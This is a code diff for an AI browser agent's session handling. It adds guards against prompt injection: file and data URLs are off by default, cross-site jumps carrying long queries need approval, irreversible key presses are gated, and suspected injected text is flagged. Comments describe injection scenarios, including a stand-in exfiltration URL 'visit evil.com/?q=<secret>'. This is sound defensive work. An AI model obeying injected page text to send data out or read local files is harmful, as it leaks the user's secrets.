@@ -37,6 +37,8 @@ export interface SessionOptions {
   robots?: 'off' | 'warn' | 'enforce';
   /** Append an "WhittleBrowser" token to the User-Agent so sites can tell an agent is driving. */
   identify?: boolean;
+  /** Let the agent open file: and data: URLs. Off by default: a hostile page could make the agent read local files. */
+  allowFileUrls?: boolean;
   downloadsDir?: string;
   /** Files may only be uploaded from here without approval. */
   uploadDir?: string;
@@ -66,7 +68,7 @@ export interface TraceEntry {
   ok: boolean;
 }
 
-const AGENT_UA = 'WhittleBrowser/0.1 (+https://github.com/whittlebrowser; AI agent acting for a user)';
+const AGENT_UA = 'WhittleBrowser/0.1 (+https://github.com/vasanth7781/whittlebrowser-engine; AI agent acting for a user)';
 
 export class Session {
   private agents = new WeakMap<Page, PageAgent>();
@@ -91,6 +93,7 @@ export class Session {
       humanize: opts.humanize ?? false,
       robots: opts.robots ?? 'warn',
       identify: opts.identify ?? true,
+      allowFileUrls: opts.allowFileUrls ?? false,
       downloadsDir: opts.downloadsDir ?? join(homedir(), 'Downloads', 'whittlebrowser'),
       uploadDir: opts.uploadDir ?? join(homedir(), 'Downloads', 'whittlebrowser'),
       ignoreUrlPrefixes: opts.ignoreUrlPrefixes ?? ['wbui:', 'devtools:', 'chrome-extension:'],
@@ -181,14 +184,31 @@ export class Session {
   async page(): Promise<Page> {
     this.idleGen++; // a tool call started: the idle hand stops
     await this.refreshHidden();
-    if (this.activePage && !this.activePage.isClosed()) return this.activePage;
+    if (this.activePage && !this.activePage.isClosed()) {
+      await this.identify(this.activePage);
+      return this.activePage;
+    }
     const ps = this.pages();
     if (ps.length) this.activePage = ps[ps.length - 1];
     else {
       this.activePage = await this.context.newPage();
       this.events = this.events.filter((e) => !e.startsWith('⧉'));
     }
+    await this.identify(this.activePage);
     return this.activePage;
+  }
+
+  /** Adds the agent token to this tab's User-Agent. Must happen before the tab loads anything, so it is done as the tab is handed out. */
+  private async identify(p: Page) {
+    if (!this.opts.identify || this.uaSet.has(p)) return;
+    this.uaSet.add(p);
+    try {
+      const cdp = await p.context().newCDPSession(p);
+      const ua = (await p.evaluate(() => navigator.userAgent).catch(() => '')) as string;
+      if (ua && !ua.includes('WhittleBrowser/')) await cdp.send('Emulation.setUserAgentOverride', { userAgent: `${ua} ${AGENT_UA}` });
+    } catch {
+      /* best effort */
+    }
   }
 
   private async agent(p: Page): Promise<PageAgent> {
@@ -197,16 +217,7 @@ export class Session {
       a = new PageAgent(p, () => this.nextRef, () => ({ engine: true, inj: INJECTION_SOURCES, xray: this.opts.xray || undefined }));
       this.agents.set(p, a);
     }
-    if (this.opts.identify && !this.uaSet.has(p)) {
-      this.uaSet.add(p);
-      try {
-        const cdp = await p.context().newCDPSession(p);
-        const ua = (await p.evaluate(() => navigator.userAgent).catch(() => '')) as string;
-        if (ua && !ua.includes('WhittleBrowser/')) await cdp.send('Emulation.setUserAgentOverride', { userAgent: `${ua} ${AGENT_UA}` });
-      } catch {
-        /* best effort */
-      }
-    }
+    await this.identify(p);
     return a;
   }
 
@@ -390,7 +401,13 @@ export class Session {
       for (let i = 0; i < steps.length; i++) {
         const step = steps[i];
         this.live(origin, stepLabel(step));
-        const res = await this.step(p, a, step, !!o.confirm);
+        let res: { ok: boolean; line: string };
+        try {
+          res = await this.step(p, a, step, !!o.confirm);
+        } catch (e) {
+          // Keep what already ran in the report: a lost log makes the model repeat a step that worked.
+          res = { ok: false, line: `✗ ${stepLabel(step)}: ${(e as Error).message.split('\n')[0].slice(0, 160)}` };
+        }
         log.push(res.line);
         if (res.ok) ran++;
         if (!res.ok) {
@@ -468,11 +485,25 @@ export class Session {
     return d;
   }
 
+  /** Asks for approval before an irreversible action. Returns the line to report if it must not run, else null. */
+  private async riskGate(p: Page, kind: string, d: Describe | null, key: string | undefined, confirm: boolean, what: string): Promise<{ ok: false; line: string } | null> {
+    const risk = classifyAction(kind, d, key);
+    if (risk.risk !== 'high' || confirm) return null;
+    const ans = await this.policy.approve({ kind: 'risk', origin: originOf(p.url()), summary: `${what}: ${risk.why}` });
+    if (ans === 'no') return { ok: false, line: `✗ ${what}: refused by user (${risk.why})` };
+    if (ans === 'confirm') return { ok: false, line: `⚠ ${what} not run: ${risk.why}. Get the user's OK, then repeat with confirm:true` };
+    return null;
+  }
+
   private async step(p: Page, a: PageAgent, s: Step, confirm: boolean): Promise<{ ok: boolean; line: string }> {
     const label = (d: Describe | null, ref: number) => `[${ref}]${d ? ` ${d.role || d.tag}${d.name ? ` "${d.name.slice(0, 50)}"` : ''}` : ''}`;
     const gone = (ref: number) => ({ ok: false, line: `✗ ${s.do} [${ref}]: element no longer exists; observe again` });
 
     if (s.do === 'press' && !s.ref) {
+      // Enter or Space acts on whatever has focus: judge it like a click on that element.
+      const focused = /^(enter|space| )$/i.test(s.key) ? await a.call<Describe | null>('describe', null) : null;
+      const refused = await this.riskGate(p, 'press', focused, s.key, confirm, `press ${s.key}${focused ? ` on ${focused.role || focused.tag}${focused.name ? ` "${focused.name.slice(0, 50)}"` : ''}` : ''}`);
+      if (refused) return refused;
       await p.keyboard.press(s.key);
       return { ok: true, line: `✓ press ${s.key}` };
     }
@@ -484,12 +515,10 @@ export class Session {
     const d = await this.resolveDescribe(p, a, ref);
     if (!d) return gone(ref);
 
-    const risk = classifyAction(s.do, d, s.do === 'press' ? s.key : undefined);
-    if (risk.risk === 'high' && !confirm) {
-      const ans = await this.policy.approve({ kind: 'risk', origin: originOf(p.url()), summary: `${s.do} ${label(d, ref)}: ${risk.why}` });
-      if (ans === 'no') return { ok: false, line: `✗ ${s.do} ${label(d, ref)}: refused by user (${risk.why})` };
-      if (ans === 'confirm') return { ok: false, line: `⚠ ${s.do} ${label(d, ref)} not run: ${risk.why}. Get the user's OK, then repeat with confirm:true` };
-    }
+    // type + submit presses Enter, so it is judged as that key press.
+    const typesThenEnters = s.do === 'type' && s.submit;
+    const refused = await this.riskGate(p, typesThenEnters ? 'press' : s.do, d, typesThenEnters ? 'Enter' : s.do === 'press' ? s.key : undefined, confirm, `${s.do} ${label(d, ref)}`);
+    if (refused) return refused;
 
     switch (s.do) {
       case 'click':
@@ -593,27 +622,12 @@ export class Session {
     }
     let url = toUrl(target, 'https://duckduckgo.com/html/?q=%s');
     url = this.privacy.reveal(url).value;
-    let u: URL;
-    try {
-      u = new URL(url);
-    } catch {
-      return this.emit('navigate', '', `✗ invalid URL`, t0, { target }, false);
-    }
-    if (!/^(https?|file|about|data):$/.test(u.protocol)) return this.emit('navigate', '', `✗ ${u.protocol} URLs are not allowed`, t0, { target }, false);
-
-    // Data-carrying jump to a different site: classic exfiltration shape (prompt-injected "visit evil.com/?q=<secret>").
-    const fromOrigin = originOf(before);
-    if (!o.confirm && fromOrigin && fromOrigin !== u.origin && (u.search.length > 64 || u.hash.length > 64) && before !== 'about:blank') {
-      const ans = await this.policy.approve({ kind: 'navigate', origin: u.origin, summary: `open ${compactUrl(url)} with a long query from ${hostOf(before)}` });
-      if (ans !== 'yes') return this.emit('navigate', fromOrigin, `⚠ not opened: ${u.host} with a ${u.search.length + u.hash.length}-char query could carry data out of ${hostOf(before)}. Get the user's OK, then repeat with confirm:true`, t0, { target }, false);
-    }
+    const problem = await this.urlProblem(url, before, { confirm: o.confirm });
+    if (problem) return this.emit('navigate', problem.origin, problem.text, t0, { target }, false);
+    const u = new URL(url);
     const notes: string[] = [];
-    if (this.opts.robots !== 'off' && /^https?:$/.test(u.protocol)) {
-      const ok = await this.robotsOk(u);
-      if (!ok) {
-        if (this.opts.robots === 'enforce') return this.emit('navigate', u.origin, `✗ ${u.host}/robots.txt disallows ${u.pathname} for agents`, t0, { target }, false);
-        notes.push(`note: robots.txt disallows this path for automated agents`);
-      }
+    if (this.opts.robots === 'warn' && /^https?:$/.test(u.protocol) && !(await this.robotsOk(u))) {
+      notes.push(`note: robots.txt disallows this path for automated agents`);
     }
     try {
       await p.goto(url, { waitUntil: 'domcontentloaded', timeout: 30_000 });
@@ -623,6 +637,34 @@ export class Session {
     }
     await this.settle(p, await this.agent(p), p.url());
     return this.report(p, undefined, notes, before, t0, { target });
+  }
+
+  /**
+   * Why the agent may not open this URL, or null if it may. Every way the agent can open a page (navigate, research,
+   * tabs) goes through here: only http(s) unless file URLs are enabled, approval for a data-carrying jump to another
+   * site (the shape of a prompt-injected "visit evil.com/?q=<secret>"), and robots.txt when it is enforced.
+   */
+  private async urlProblem(raw: string, from: string, o: { confirm?: boolean; checkJump?: boolean } = {}): Promise<{ text: string; origin: string } | null> {
+    let u: URL;
+    try {
+      u = new URL(raw);
+    } catch {
+      return { text: '✗ invalid URL', origin: '' };
+    }
+    const ok = raw === 'about:blank' || (this.opts.allowFileUrls ? /^(https?|file|data):$/ : /^https?:$/).test(u.protocol);
+    if (!ok) {
+      const hint = u.protocol === 'file:' || u.protocol === 'data:' ? ' (the server must be started with --allow-file-urls)' : '';
+      return { text: `✗ ${u.protocol} URLs are not allowed${hint}`, origin: '' };
+    }
+    const fromOrigin = originOf(from);
+    if (!o.confirm && o.checkJump !== false && fromOrigin && fromOrigin !== u.origin && (u.search.length > 64 || u.hash.length > 64) && from !== 'about:blank') {
+      const ans = await this.policy.approve({ kind: 'navigate', origin: u.origin, summary: `open ${compactUrl(raw)} with a long query from ${hostOf(from)}` });
+      if (ans !== 'yes') return { text: `⚠ not opened: ${u.host} with a ${u.search.length + u.hash.length}-char query could carry data out of ${hostOf(from)}. Get the user's OK, then repeat with confirm:true`, origin: fromOrigin };
+    }
+    if (this.opts.robots === 'enforce' && /^https?:$/.test(u.protocol) && !(await this.robotsOk(u))) {
+      return { text: `✗ ${u.host}/robots.txt disallows ${u.pathname} for agents`, origin: u.origin };
+    }
+    return null;
   }
 
   private async robotsOk(u: URL): Promise<boolean> {
@@ -669,7 +711,7 @@ export class Session {
       if (h.off) t += ' ↓';
       return t;
     });
-    const text = lines.length ? `find "${query}": ${lines.length} hit(s)\n${lines.join('\n')}` : `find "${query}": no matches (try fewer words, or role:button …)`;
+    const text = lines.length ? `find "${query}": ${lines.length} hit(s)\n${flagInjection(lines.join('\n'))}` : `find "${query}": no matches (try fewer words, or role:button …)`;
     return this.emit('find', origin, text, t0, { query });
   }
 
@@ -695,7 +737,7 @@ export class Session {
         const head = r.header ? r.header.join(' | ') : '';
         const fit = fitLines(rows, budget - estimateTokens(head) - 30);
         const end = offset + fit.length;
-        text = [`table rows ${offset + 1}-${end} of ${r.total}${end < r.total ? ` (next: offset=${end})` : ''}`, head, ...fit].filter(Boolean).join('\n');
+        text = flagInjection([`table rows ${offset + 1}-${end} of ${r.total}${end < r.total ? ` (next: offset=${end})` : ''}`, head, ...fit].filter(Boolean).join('\n'));
       }
     } else if (o.kind === 'list') {
       const r = await a.call<{ cols: string[]; rows: string[][]; total: number } | { error: string }>('list', o.ref ?? null, offset, 80);
@@ -704,7 +746,7 @@ export class Session {
         const rows = r.rows.map((c, i) => `${offset + i + 1}. ${c.filter(Boolean).join(' | ')}`);
         const fit = fitLines(rows, budget - 30);
         const end = offset + fit.length;
-        text = [`${r.total} items · cols: ${r.cols.join(', ')}${end < r.total ? ` · showing ${offset + 1}-${end} (next: offset=${end})` : ''}`, ...fit].join('\n');
+        text = flagInjection([`${r.total} items · cols: ${r.cols.join(', ')}${end < r.total ? ` · showing ${offset + 1}-${end} (next: offset=${end})` : ''}`, ...fit].join('\n'));
       }
     } else {
       const r = await a.call<{ md: string; ref?: number } | { error: string }>('read', o.ref ?? null, !!o.links);
@@ -737,13 +779,15 @@ export class Session {
       if (!targets.length) return this.emit('research', origin, '✗ research: no result links found on this page; pass urls', t0, o, false);
     }
     targets = targets.slice(0, limit);
+    // URLs the model chose are checked like navigate; links taken from the page only need a safe scheme.
+    const problems = await Promise.all(targets.map((t) => this.urlProblem(t.url, from.url(), { checkJump: !!o.urls?.length })));
     this.live(origin, `research · opening ${targets.length} pages in parallel`);
 
     // Open every tab first (loads overlap), then read them concurrently.
     this.quietOpen++;
     const pages: (Page | null)[] = [];
     try {
-      for (const t of targets) pages.push(await this.openBackground(t.url));
+      for (let i = 0; i < targets.length; i++) pages.push(problems[i] ? null : await this.openBackground(targets[i].url));
     } finally {
       this.quietOpen--;
     }
@@ -751,8 +795,8 @@ export class Session {
     const results = await Promise.all(targets.map(async (t, i) => {
       const p = pages[i];
       const host = hostOf(t.url);
-      if (!p) return `## ${i + 1}. ${host}
-✗ could not open`;
+      if (!p) return `## ${i + 1}. ${host || targets[i].url.slice(0, 40)}
+${problems[i]?.text ?? '✗ could not open'}`;
       try {
         await p.waitForLoadState('domcontentloaded', { timeout: 20_000 }).catch(() => {});
         const a = await this.agent(p);
@@ -789,6 +833,7 @@ ${g.block}`;
       return created;
     }
     const p = await this.context.newPage();
+    await this.identify(p); // before the first request, not after it
     p.goto(url, { waitUntil: 'domcontentloaded', timeout: 20_000 }).catch(() => {});
     return p;
   }
@@ -797,6 +842,10 @@ ${g.block}`;
   async tabs(o: { op: 'list' | 'open' | 'switch' | 'close'; url?: string; index?: number }): Promise<string> {
     const t0 = Date.now();
     await this.refreshHidden();
+    if (o.op === 'open' && o.url) {
+      const problem = await this.urlProblem(toUrl(o.url), (await this.page()).url());
+      if (problem) return this.emit('tabs', problem.origin, problem.text, t0, o, false);
+    }
     if (o.op === 'open' && this.policy.openTab) {
       const created = this.context.waitForEvent('page', { timeout: 10_000 }).catch(() => null);
       if (!(await this.policy.openTab(o.url || 'about:blank'))) return this.emit('tabs', '', '✗ could not open a tab', t0, o, false);
@@ -885,8 +934,9 @@ ${g.block}`;
       const needle = (o.text || o.gone)!.toLowerCase();
       const want = !!o.text;
       const ok = await this.pollUntil(async () => {
-        const has = await p.evaluate((n) => (document.body?.innerText || '').toLowerCase().includes(n), needle).catch(() => false);
-        return has === want;
+        // An error (page navigating, context destroyed) means "unknown": keep polling instead of calling it gone.
+        const has = await p.evaluate((n) => (document.body?.innerText || '').toLowerCase().includes(n), needle).catch(() => null);
+        return has !== null && has === want;
       }, o.timeoutMs ?? 15_000);
       return this.report(p, this.baselines.get(p), [ok ? `✓ ${want ? 'appeared' : 'gone'}: "${o.text || o.gone}"` : `✗ timeout waiting for "${o.text || o.gone}"`], p.url(), t0, o, ok);
     }
@@ -910,7 +960,7 @@ ${g.block}`;
 }
 
 function flagInjection(text: string): string {
-  return text.split('\n').map((l) => (looksLikeInjection(l) ? '⚠ ' + l : l)).join('\n');
+  return text.split('\n').map((l) => (!l.startsWith('⚠') && looksLikeInjection(l) ? '⚠ ' + l : l)).join('\n');
 }
 
 function stepLabel(s: Step): string {
